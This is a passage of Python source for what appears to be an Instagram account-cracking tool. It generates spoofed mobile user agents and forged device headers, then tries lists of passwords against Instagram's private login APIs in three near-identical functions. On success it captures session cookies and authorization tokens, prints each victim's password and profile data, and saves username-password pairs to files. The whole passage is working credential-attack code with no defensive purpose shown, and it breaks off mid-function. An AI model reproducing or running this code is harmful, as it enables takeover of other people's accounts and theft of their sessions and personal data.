5,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,84.0.0.21.105,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,133.0.0.7.120,116.0.0.34.121,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.26.134,117.0.0.28.123,123.0.0.21.114,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,126.0.0.25.121,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,104.0.0.21.118,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,125.0.0.20.126,132.0.0.26.134,132.0.0.26.134,128.0.0.19.128,132.0.0.26.134,121.0.0.29.119,132.0.0.26.134,132.0.0.26.134,132.0.0.26.134,131.0.0.25.116,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,122.0.0.29.238,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,131.0.0.25.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,131.0.0.23.116,128.0.0.26.128,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,132.0.0.26.134,123.0.0.21.114,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,133.0.0.32.120,123.0.0.21.114,133.0.0.32.120,131.0.0.23.116,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,131.0.0.23.116,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,133.0.0.32.120,111.1.0.25.152,133.0.0.32.120,131.0.0.23.116,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,130.0.0.31.121,133.0.0.32.120,133.0.0.32.120,128.0.0.26.128,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,87.0.0.18.99,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,97.0.0.32.119,131.0.0.25.116,129.0.0.29.119,131.0.0.23.116,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,127.0.0.30.121,133.0.0.32.120,132.0.0.26.134,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,132.0.0.26.134,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,111.1.0.25.152,129.0.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
	igve = igv.split(",")
	versi_ = random.choice(igve)
	versi = f'{random.randint(100,423)}.{random.randint(1,15)}.0.{random.randint(30,45)}.{random.randint(90,150)}'
	uas1 = f"Instagram {versi_} Android ({android_version}; {dpis}; {pxl}; realme; RMX3269; RED8F6; RMX3265; {language}; {kode})"
	uas2 = f"Instagram {versi_} Android ({android_version}; {dpis}; {pxl}; Xiaomi/Redmi; M2003J15SC; merlinnfc; mt6768; {language}; {kode})"
	uas3 = f"Instagram {versi_} Android ({android_version}; {dpis}; {pxl}; OPPO; CPH2145; OP4F1BL1; qcom; {language}; {kode})"
	uas4 = f"Instagram {versi_} Android ({android_version}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8T; willow; qcom; {language}; {kode})"
	uas5 = f"Instagram {versi} (iPhone12,1; iOS 16_6_1; ru_RU; ru-RU; scale=2.00; {pxl}; 452417278) NW/3"
	uas6 = f"Instagram {versi} (iPhone13,1; iOS 16_1_1; en_US; en; scale=3.00; {pxl}; 514327624)"
	uas7 = f"Instagram {versi} (iPhone14,4; iOS 16_7; en_GB; en; scale=3.00; {pxl}; 514327624) NW/3"
	uas8 = f"Instagram {versi} (iPhone9,3; iOS 15_7_8; it_IT; it; scale=2.00; {pxl}; 518059364)"
	uas9 = f"Instagram {versi} (iPhone11,2; iOS 16_3_1; pt_BR; pt; scale=3.00; {pxl}; 514327624)"
	uas10 = f"Instagram {versi} (iPhone12,1; iOS 16_1_2; en_AU; en; scale=2.00; {pxl}; 496486330)"
	uas11 = f"Instagram {versi} (iPhone13,2; iOS 16_0_2; en_FR; en; scale=3.00; {pxl}; 478871389) NW/3"
	uas12 = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; Xiaomi/Redmi; M2010J19SY; lemon; qcom; {language}; {kode})"
	uas13 = f"Instagram {versi} Android ({android_version}; {dpis}; {pxl}; OPPO; CPH2333; OP530DL1; qcom; {language}; {kode})"
	BaseReturn = random.choice([uas1, uas2, uas3, uas4, uas5, uas6, uas7, uas8, uas9, uas10, uas11, uas12, uas13])
	return BaseReturn

def bloks_version_id():
	return random.choice(['16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf','9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a','c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49','edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'])
	
def Crack_api(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	print(f" {h}[{P}●{h}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {h}{Ok} {P}Failed {k}{Cp}", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({
				'x-fb-http-engine': 'Liger',
				'Host': 'i.instagram.com',
				'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
				'x-ig-capabilities': '3brTv10=',
				'x-ig-device-id': device_id,
				'x-tigon-is-retry': 'True, True',
				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				'x-ig-connection-type': 'MOBILE(LTE)',
				'connection': 'keep-alive',
				'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
				'x-ig-www-claim': '0',
				'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
				'x-ig-mapped-locale': 'id_ID',
				'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
				'x-ig-app-locale': 'in_ID',
				'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
				'user-agent': uag,
				'x-ig-family-device-id': family_device_id,
				'x-bloks-is-layout-rtl': 'False',
				'x-fb-connection-type': 'MOBILE.LTE',
				'x-fb-server-cluster': 'True',
				'accept-language': 'id-ID, en-US',
				'ig-intended-user-id': '0',
				'x-ig-app-id': '3419628305025917',
				'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
				'priority': 'u=3',
				'x-ig-timezone-offset': str(-time.timezone),
				'x-ig-device-locale': 'in_ID',
				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
				'x-fb-client-ip': 'True'
			})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C %22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
					except Exception as e:
						cookies = ('-')
				except Exception as e:
					ig_set_authorization = (None)
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {h}[{P}●{h}]{P} Target Data Information")
				print(f"     {h}＼{P} Fullnames :{h} {fullname} ")
				print(f"     {h}＼{P} Usernames :{h} {username} ")
				print(f"     {h}＼{P} Passwords :{h} {password} ")
				print(f"     {h}＼{P} Followers :{h} {peng} ")
				print(f"     {h}＼{P} Following :{h} {meng} ")
				print(f"     {h}＼{P} Mycookies :{h} {cookies} \n")
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {uag}\n ")
				open('/sdcard/RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def Crack_i(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	print(f" {b}[{P}●{b}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {b}{Ok} {P}Failed {k}{Cp}", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ua = UserAgentApp()
			ses = requests.Session()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
			data = (f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D')
			response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
			if 'logged_in_user' in str(response.text) and '"pk_id":' in str(response.text):
				ig_set_authorization = f"{response.headers.get('ig-set-authorization')}"
				Ok += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {b}[{P}●{b}]{P} Target Data Information")
				print(f"     {b}＼{P} Fullnames :{b} {fullname} ")
				print(f"     {b}＼{P} Usernames :{b} {username} ")
				print(f"     {b}＼{P} Passwords :{b} {password} ")
				print(f"     {b}＼{P} Followers :{b} {peng} ")
				print(f"     {b}＼{P} Following :{b} {meng} ")
				print(f"     {b}＼{P} Autorized :{b} {ig_set_authorization} \n")
				open('/sdcard/RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
				break
			elif 'checkpoint' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
				Cp += 1
				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
				print(f"                                                                ", end='\r')
				time.sleep(0.10)
				print(f" {k}[{P}●{k}]{P} Target Data Information")
				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
				print(f"     {k}＼{P} Usernames :{k} {username} ")
				print(f"     {k}＼{P} Passwords :{k} {password} ")
				print(f"     {k}＼{P} Followers :{k} {peng} ")
				print(f"     {k}＼{P} Following :{k} {meng} ")
				print(f"     {k}＼{P} Useragent :{k} {ua}\n ")
				open('/sdcard/RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(20)
	Loop += 1

def cookie_bearer(cookie):
    abcd = json.loads(base64.b64decode(cookie).decode())
    coki = ';'.join(['%s=%s' % (x, y) for x, y in abcd.items()])
    return coki + f';dpr=2;ig_did={str(uuid.uuid4()).upper()}'

def x_mid(mid_list):
    if len(mid_list) > 0:
        return random.choice(mid_list)
    lr = 'abcdefghijklmnopqrstuvwxyz1234567890'
    xc = ''.join(random.choice(lr.upper()) for _ in range(6))
    return f'ZpFI1wABAAET6tZpG_yS09{xc}'



def Crack_Ajax(username, memek):
	global Ok, Cp, Loop
	bo = random.choice([u])
	print(f" {h}[{P}●{h}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {h}{Ok} {P}Failed {k}{Cp}", end="\r")
	sys.stdout.flush()
	for password in memek:
		try:
			ses = requests.Session()
			uag = UserAgentBarcelona()
			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
			_hash = hashlib.md5()
			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
			hex_ = _hash.hexdigest()
			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
			ses.headers.update({'x-fb-http-engine': 'Liger',
                'Host': 'i.instagram.com',
                'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-device-id': device_id,
                'x-tigon-is-retry': 'True, True',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'connection': 'keep-alive',
                'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                'x-ig-www-claim': '0',
                'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                'x-ig-app-locale': 'in_ID',
                'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                'user-agent': uag,
                'x-ig-family-device-id': family_device_id,
                'x-bloks-is-layout-rtl': 'False',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-fb-server-cluster': 'True',
                'accept-language': 'id-ID, en-US',
                'ig-intended-user-id': '0',
                'x-ig-app-id': '3419628305025917',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
                'priority': 'u=3',
                'x-ig-timezone-offset': str(-time.timezone),
                'x-ig-device-locale': 'in_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-fb-client-ip': 'True'})
			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\
                      bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
				try:
					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
					try:
						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
